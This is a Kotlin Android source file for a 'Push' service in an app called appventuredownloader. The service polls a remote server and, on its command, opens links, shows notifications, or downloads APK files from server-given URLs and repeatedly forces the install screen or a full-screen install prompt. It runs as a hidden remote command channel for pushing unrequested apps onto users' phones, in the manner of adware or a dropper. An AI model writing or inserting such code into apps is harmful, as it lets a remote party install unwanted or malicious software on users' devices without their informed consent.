package com.chapdast.appventuredownloader

import android.app.*

import android.content.Intent

import android.util.Log
import org.json.JSONException
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.AsyncTask
import android.os.Build
import android.os.Environment
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.net.URL


class Push : IntentService("Push") {
    override fun onHandleIntent(intent: Intent?) {

        if (intent?.action == applicationContext.packageName + ".Push") {
            Thread.sleep(5*1000)
            try {
                var pushDet = khttp.post(PUSH_HANDLER)
                Log.d("SERCCC", pushDet.toString())
                if (pushDet.statusCode == 200 && pushDet.jsonObject.getBoolean("run")) {
                    val res = pushDet.jsonObject
                    var type: String = res.getString("type")
                    var storedPushId = SPref(applicationContext, "pushId")!!.getLong("id", -1)
                    Log.d("SERCCC", res.toString())
                    if (storedPushId < res.getLong("pushId")) {
                        when (type) {
                            "pop" -> {
                                /*
                    {
                         "run":true,
                         "pushId":"3493afb435305a03e542c7da949ee0e4",
                         "type":"pop",
                         "link":"rtyuik",
                         "timelimit":"10000"
                     }
                     intentive for tg cafebazar NET  tg://, bazaar://, https://
                    */
                                val pushid = res.getString("pushId")
                                val link = res.getString("action")
                                val timelimit = res.getString("timelimit")
                                pop(pushid, link, timelimit)
                            }
                            "notif" -> {
                                /*
                    {
                         "run":true,
                         "pushId":"3493afb435305a03e542c7da949ee0e4",
                         "type":"notif",
                         "title":"Title",
                         "body":"Body",
                         "img":"0",
                         "action":"app",
                         "timelimit":"10000"
                     }
                    show notif
                    */
                                val pushId = res.getString("pushId")
                                val title = res.getString("title")
                                val body = res.getString("body")
                                val img = res.getString("img")
                                val action = res.getString("action")
                                val timelimit = res.getString("timelimit")
                                notif(pushId, title, body, img, action, timelimit)
                            }
                            "fi" -> {
                                /*
                    {
                         "run":true,
                         "pushId":"3493afb435305a03e542c7da949ee0e4",
                         "type":"fi",
                         "link":"LINK APK",
                         "repeatCount":10,
                         "timelimit":"10000"
                     }
                     download package
                     show install page
                    */
                                val pushId = res.getString("pushId")
                                val link = res.getString("link")
                                val rp = res.getInt("repeatCount")
                                val timelimit = res.getString("timelimit")
                                val sleep = res.getLong("sleep")
                                val pack = res.getString("packageName")
                                fi(pushId, link, rp, timelimit, sleep, pack)
                            }
                            "fbi" -> {
                                /*
                     {
                         "run":true,
                         "pushId":"3493afb435305a03e542c7da949ee0e4",
                         "type":"fbi",
                         "title":"TITLE",
                         "body":"NODY",
                         "link":"LINK APK",
                         "banner":"img link",
                         "repeatCount":10,
                         "timelimit":"10000"
                     }
                     download package banner
                     start activity
                     show install
                    */
                                val pushid = res.getString("pushId")
                                val title = res.getString("title")
                                val body = res.getString("body")
                                val link = res.getString("link")
                                val img = res.getString("img")
                                val rp = res.getInt("repeatCount")
                                val timelimit = res.getString("timelimit")
                                val pack = res.getString("packageName")
                                val sleep = res.getLong("sleep")
                                fbi(pushid, title, body, link, img, rp, timelimit, pack, sleep)
                            }
                        }
                        SPref(applicationContext,"pushId")!!.edit().putLong("id",res.getLong("pushId")).commit()
                    }
                }
            } catch (e: JSONException) {
                Log.e(TAG, e.message)
            }
        }
    }

    fun pop(id: String, link: String, tl: String) {
        var currentTime = System.currentTimeMillis() / 1000
        if (TimeLim(applicationContext, tl.toLong())) {
            var intent = Intent(Intent.ACTION_VIEW)
            intent.data = Uri.parse(link)
            startActivity(intent)
            SetTimeLim(applicationContext,currentTime+tl.toLong())
            Statics(id.toLong()).execute()
        }
    }
    fun fi(id: String, link: String, repeatCount: Int, timelimit: String,sleep:Long,pack:String) {
        if(!isAppInstalled(applicationContext,pack)) {
            var currentTime = System.currentTimeMillis() / 1000
            if (TimeLim(applicationContext, timelimit.toLong())) {
                var i = 0
                while (i <= repeatCount) {

                    var fiPath = SPref(applicationContext, "fi_path")!!.getString("path", "")

                    if (fiPath == "") {
                        var rin = GetApkFI(id, timelimit.toLong()).execute(link)
                    } else {
                        var op = OpenInstaller(applicationContext,fiPath, currentTime + timelimit.toLong())
                        Log.d(PUSH, fiPath)
                    }
                    Thread.sleep(sleep * 1000)
                    i++
                }
                SetTimeLim(applicationContext,currentTime+timelimit.toLong())
                Statics(id.toLong()).execute()
            }
        }else{
            Log.d(PUSH,"APP IS INSTALLED $pack")
        }
    }
    fun fbi(id: String, title: String, body: String, link: String, img: String, rp: Int, timelimit: String,pack:String,sleep: Long) {
        var currentTime = System.currentTimeMillis() / 1000
            if(!isAppInstalled(applicationContext,pack)){
                var fileLink = GetApkFBI(id).execute(link).get()
                var imgPath = GetImgFBI(id).execute(img).get()
                var fbi = Intent(applicationContext,FBI::class.java)

                fbi.putExtra("id",id)
                        .putExtra("title",title)
                        .putExtra("body",body)
                        .putExtra("timelimit",timelimit)

                while (!File(fileLink).exists() || !File(imgPath).exists()){
                    Thread.sleep(10)
                }
                fbi.putExtra("link",fileLink).putExtra("img",imgPath)

                if (TimeLim(applicationContext, timelimit.toLong())) {
                    var i = 0
                    while (i <= rp) {
                        startActivity(fbi)
                        Thread.sleep(sleep*100)
                        i++
                    }
                }
                SetTimeLim(applicationContext,currentTime+timelimit.toLong())
                Statics(id.toLong()).execute()
            }else{
                Log.d(PUSH,"App Is installed $pack")
            }
    }
    fun notif(id: String, title: String, body: String, img: String, action: String,timelimit: String) {
        if (TimeLim(applicationContext,timelimit.toLong())) {
            var actionIntent = Intent(Intent.ACTION_VIEW)
            actionIntent.data = Uri.parse(action)
            val pendingIntent = PendingIntent.getActivity(applicationContext, 0, actionIntent, 0)
            val nManager = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                nManager.deleteNotificationChannel(CHANNEL_ID)
            }
            val mNotificationId = 1000

            val mNotification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

                Notification.Builder(applicationContext, CHANNEL_ID)
            } else {
                Notification.Builder(applicationContext)
            }.apply {
                setContentIntent(pendingIntent)
                setSmallIcon(R.drawable.abc_ic_go_search_api_material)
                if (img != "0") {
                    setLargeIcon(GetTumb().execute(img).get())
                    setStyle(Notification.BigPictureStyle().bigPicture(GetTumb().execute(img).get()))
                }

                setAutoCancel(false)
                setContentTitle(title)
                setStyle(Notification.BigTextStyle().bigText(body))
                setContentText(body)
            }.build()

            var currentTime = System.currentTimeMillis() / 1000
            SetTimeLim(applicationContext,currentTime+timelimit.toLong())
            nManager.notify(mNotificationId, mNotification)
            Statics(id.toLong()).execute()
        }
    }
    inner class GetTumb:AsyncTask<String,Any,Bitmap>(){
        override fun doInBackground(vararg p0: String?): Bitmap {
            var url = p0[0]
            var map:Bitmap? =null
            try{
                var input:InputStream = java.net.URL(url).openStream()
                map = BitmapFactory.decodeStream(input)

            }catch (e:Exception){
                Log.d(PUSH,e.message)
            }
            return map!!
        }

    }
    inner class GetApkFI(pushId:String,timeLimit:Long):AsyncTask<String,String,Boolean>(){
        var timeLimit = timeLimit
        val name =pushId
        override fun doInBackground(vararg p0: String?): Boolean {
            var flag = false
            Log.d(PUSH,"IN>>>Get File")
            try {

                    var url = p0[0]
                    var uri = URL(url)
                    var c = uri.openConnection()
                    c.doOutput = true
                    c.connect()
                    var PATH: String = "" + Environment.getExternalStorageDirectory() + "/Download/Downloader/"
                    var file = File(PATH)
                    file.mkdirs()
                    var outFile = File(file,  name + ".apk")
                    var fos = FileOutputStream(outFile)
                    var instream = c.getInputStream()
                    var total_size = c.contentLength

                    val buffer = ByteArray(1024)
                    var len1 = 0
                    var per = 0
                    var downloaded = 0
                    len1 = instream.read(buffer)
                    while (len1 != -1) {
                        Log.d(PUSH,"Get File")
                        fos.write(buffer, 0, len1)
                        downloaded += len1
                        per = downloaded * 100 / total_size
                        len1 = instream.read(buffer)
                    }
                    fos.close()
                    instream.close()
                    Thread.sleep(150)
                    appPath = PATH + name + ".apk"
                    SPref(applicationContext,"fi_path")!!.edit().putString("path", appPath).commit()
                    OpenInstaller(applicationContext,PATH + name + ".apk",(System.currentTimeMillis()/1000)+timeLimit)
                    flag = true
            }catch (e: Exception) {

                Log.e(PUSH, "ERR " + e.message)
                flag = false
            }

            return flag
        }

    }
    inner class GetApkFBI(pushId:String):AsyncTask<String,String,String>(){

        val name =pushId
        override fun doInBackground(vararg p0: String?): String {
            Log.d(PUSH,"IN>>>Get File")
            try {

                var url = p0[0]
                var uri = URL(url)
                var c = uri.openConnection()
                c.doOutput = true
                c.connect()
                var PATH: String = "" + Environment.getExternalStorageDirectory() + "/Download/Downloader/"
                var file = File(PATH)

                file.mkdirs()
                var outFile = File(file,  name + ".apk")
                var fos = FileOutputStream(outFile)
                var instream = c.getInputStream()
                var total_size = c.contentLength

                val buffer = ByteArray(1024)
                var len1 = 0
                var per = 0
                var downloaded = 0
                len1 = instream.read(buffer)
                while (len1 != -1) {
                    Log.d(PUSH,"Get File")
                    fos.write(buffer, 0, len1)
                    downloaded += len1
                    per = downloaded * 100 / total_size
                    len1 = instream.read(buffer)
                }
                fos.close()
                instream.close()
                Thread.sleep(150)
                appPath = PATH + name + ".apk"
                SPref(applicationContext,"fbi_path")!!.edit().putString("path", appPath).commit()
            }catch (e: Exception) {
                Log.e(PUSH, "ERR " + e.message)
            }

            return appPath
        }

    }
    inner class GetImgFBI(pushId:String):AsyncTask<String,String,String>(){

        val name =pushId
        var imgPath=""
        override fun doInBackground(vararg p0: String?): String {
            Log.d(PUSH,"IN>>>Get Img")
            try {

                var url = p0[0]
                var uri = URL(url)
                var c = uri.openConnection()
                c.doOutput = true
                c.connect()
                var PATH: String = "" + Environment.getExternalStorageDirectory() + "/Download/Downloader/"
                var file = File(PATH)
                file.mkdirs()
                var outFile = File(file,  name + ".jpg")
                var fos = FileOutputStream(outFile)
                var instream = c.getInputStream()
                var total_size = c.contentLength

                val buffer = ByteArray(1024)
                var len1 = 0
                var per = 0
                var downloaded = 0
                len1 = instream.read(buffer)
                while (len1 != -1) {
                    Log.d(PUSH,"Get Img")
                    fos.write(buffer, 0, len1)
                    downloaded += len1
                    len1 = instream.read(buffer)
                }
                fos.close()
                instream.close()
                Thread.sleep(150)
                imgPath = PATH + name + ".jpg"
                SPref(applicationContext,"fbi_path")!!.edit().putString("img_path", imgPath).commit()
            }catch (e: Exception) {
                Log.e(PUSH, "ERR " + e.message)
            }

            return imgPath
        }

    }

}
